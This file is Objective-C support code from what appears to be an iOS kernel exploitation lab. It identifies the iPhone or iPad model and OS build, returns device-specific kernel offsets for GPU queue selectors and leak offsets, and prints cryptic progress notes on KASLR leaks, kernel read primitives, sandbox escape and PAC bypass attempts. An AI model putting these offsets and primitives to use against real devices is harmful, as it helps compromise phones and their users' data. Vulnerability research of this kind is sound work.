#define LAB_OFFSETS_NO_REDIRECT 1
#import "LabDeviceProfile.h"
#import "A14_23F77_LabOffsets.h"
#import "A12X_23G71_LabOffsets.h"
#import "LabRuntimeOffsets.h"
#import "LabLocalTime.h"
#import <sys/sysctl.h>
#import <sys/utsname.h>
#import <UIKit/UIKit.h>
#include <string.h>

static NSString *lp_sysctl(const char *name) {
    size_t n = 0;
    if (sysctlbyname(name, NULL, &n, NULL, 0) != 0 || n == 0) return @"?";
    char *b = calloc(1, n + 1);
    if (!b) return @"?";
    sysctlbyname(name, b, &n, NULL, 0);
    NSString *s = [NSString stringWithUTF8String:b];
    free(b);
    return s ?: @"?";
}

LabSku LabDeviceProfile_sku(void) {
    return [LabDeviceProfile sku];
}

const char *LabDeviceProfile_sku_string(LabSku sku) {
    switch (sku) {
        case LabSkuA12X_23G71: return "A12X_23G71";
        case LabSkuA12X_other: return "A12X_other";
        case LabSkuXR_22H311:  return "XR_22H311";
        case LabSkuA14_23F77:  return "A14_23F77";
        case LabSkuA14_other:  return "A14_other";
        default:               return "Unknown";
    }
}

@implementation LabDeviceProfile

+ (NSString *)machine { return lp_sysctl("hw.machine"); }
+ (NSString *)osversion { return lp_sysctl("kern.osversion"); }

+ (LabSku)sku {
    NSString *m = [self machine];
    NSString *v = [self osversion];
    BOOL a14 = [m hasPrefix:@"iPhone13,"];
    BOOL a12x = [m hasPrefix:@"iPad8,"];
    BOOL xr = [m hasPrefix:@"iPhone11,8"] || [m hasPrefix:@"iPhone11,2"]
           || [m hasPrefix:@"iPhone11,4"] || [m hasPrefix:@"iPhone11,6"];
    if (a14 && [v isEqualToString:@"23F77"]) return LabSkuA14_23F77;
    if (a14) return LabSkuA14_other;
    if (a12x && [v isEqualToString:@"23G71"]) return LabSkuA12X_23G71;
    if (a12x) return LabSkuA12X_other;
    if (xr) return LabSkuXR_22H311;
    return LabSkuUnknown;
}

+ (NSString *)skuName {
    switch ([self sku]) {
        case LabSkuA14_23F77:  return @"iPhone13,* A14 / 23F77";
        case LabSkuA14_other:  return @"iPhone13,* A14 / not 23F77";
        case LabSkuA12X_23G71: return @"iPad8,* A12X / 23G71";
        case LabSkuA12X_other: return @"iPad8,* A12X / not 23G71";
        case LabSkuXR_22H311:  return @"XR A12 / 18.7.x FIELD#";
        default:               return @"unknown";
    }
}

+ (BOOL)isA14_23F77 { return [self sku] == LabSkuA14_23F77; }
+ (BOOL)isExactOraclePair {
    LabSku s = [self sku];
    return s == LabSkuA14_23F77 || s == LabSkuA12X_23G71;
}

+ (NSString *)stopUnlessA14_23F77:(NSString *)probe {
    if ([self sku] == LabSkuUnknown)
        return [NSString stringWithFormat:@"STOP %@ — unknown machine.\n%@\n",
                probe ?: @"probe", [self identBlock]];
    return nil;
}

+ (uint32_t)queueCreateSel { return LabOff()->queue_create_sel; }
+ (uint32_t)queueDestroySel { return LabOff()->queue_destroy_sel; }
+ (uint32_t)queueSubmitSel { return LabOff()->submit_sel; }
+ (uint32_t)queueCreateSize { return LabOff()->queue_create_size; }
+ (uint32_t)queueLeakOff { return LabOff()->queue_leak; }
+ (uint32_t)sysmemMdOff { return LabOff()->sysmem_md; }
+ (uint32_t)sel36 { return LabOff()->sel36; }

+ (NSArray<NSNumber *> *)queueCreateSizeSweep {
    uint32_t sz = LabOff()->queue_create_size;
    return @[ @(sz), @(0x408u), @(0x410u) ];
}

+ (NSString *)banner {
    return [NSString stringWithFormat:@"[%@] %@ %@ offsets=%s",
            [self skuName], [self machine], [self osversion], LabOff()->tag];
}

+ (NSString *)expectQueueCreate {
    return [NSString stringWithFormat:@"QueueCreate sel=%u size=0x%x leak=+0x%x",
            [self queueCreateSel], [self queueCreateSize], [self queueLeakOff]];
}
+ (NSString *)expectP010LastRef { return @"P010 last-ref: word1 small int; K-"; }
+ (NSString *)expectNecpReach { return @"NECP SO_NECP=0x1109 TLV=7; 84561/84507 map"; }
+ (NSString *)expectP009PathB { return @"P009 PathB REPLACE_OK F (stale GPU) not W"; }
+ (NSString *)expectAVEOpen { return @"AVE Open 0x8367fb0; 84607 Close/async lock gap"; }
+ (NSString *)expect64788 { return @"64788 getter +0x90 naked; cd8 not KRW"; }
+ (NSString *)oracleTable { return @"oracle: LEFT=runtime sku; do not paste iPad VAs\n"; }
+ (NSString *)proveMatrix {
    return @"prove matrix 23F77:\n"
           @"  hasKread=NO until commitSlide kread32(kbase)==MH_MAGIC_64\n"
           @"  LIVE: P057 65343 KASLR sel0/1; P044 43748 occupancy write; 64788 Facet A 0x2be oracle\n"
           @"  CLOSED: 84523 sandbox (P057/P051/P052); P045 recv; LightSword last-wire GPU OOM; type-3 PACGA\n"
           @"  PARKED: 28968 reap; 163-sel; 0x800; hop-1; AfterKread; P062\n";
}
+ (NSString *)slideDestMap { return @"43724 pager dest unnamed; #536=22\n"; }
+ (NSString *)writeClassMap { return @"W not found this factory. F≠W. 84607 AVE race class.\n"; }
+ (NSString *)patchOracleMap { return @"26.7: NECP underflow, UPL validation, wvek len<=512, AMFI TC\n"; }

+ (NSString *)identBlock {
    NSMutableString *out = [NSMutableString string];
    struct utsname u;
    uname(&u);
    [out appendFormat:@"=== IDENT %d ===\n", LabLocalMilitaryNow()];
    [out appendFormat:@"machine        %@\n", [self machine]];
    [out appendFormat:@"osversion      %@\n", [self osversion]];
    [out appendFormat:@"release        %s\n", u.release];
    [out appendFormat:@"sku            %@\n", [self skuName]];
    [out appendFormat:@"offset table   %s\n", LabOff()->tag];
    [out appendFormat:@"QueueCreate    sel=%u size=0x%x leak=+0x%x destroy=%u submit=%u MD+0x%x sel36=%u\n",
         [self queueCreateSel], [self queueCreateSize], [self queueLeakOff],
         [self queueDestroySel], [self queueSubmitSel], [self sysmemMdOff], [self sel36]];
    switch ([self sku]) {
        case LabSkuA14_23F77:
            [out appendString:@"TRACK: iPhone13 A14 23F77 ACTIVE. Dual-oracle LEFT.\n"];
            break;
        case LabSkuA14_other:
            [out appendFormat:@"TRACK: A14 osversion=%@ NOT 23F77.\n", [self osversion]];
            break;
        case LabSkuA12X_23G71:
            [out appendString:@"TRACK: iPad A12X 23G71. Do not paste T8020 VAs into A14.\n"];
            break;
        case LabSkuA12X_other:
            [out appendFormat:@"TRACK: iPad A12X osversion=%@.\n", [self osversion]];
            break;
        case LabSkuXR_22H311:
            [out appendString:@"TRACK: XR A12 FIELD# only.\n"];
            break;
        default:
            [out appendString:@"TRACK: unknown — paste Ident before panic tests.\n"];
            break;
    }
    [out appendString:@"Runtime profile always wins.\n"];
    return out;
}

@end
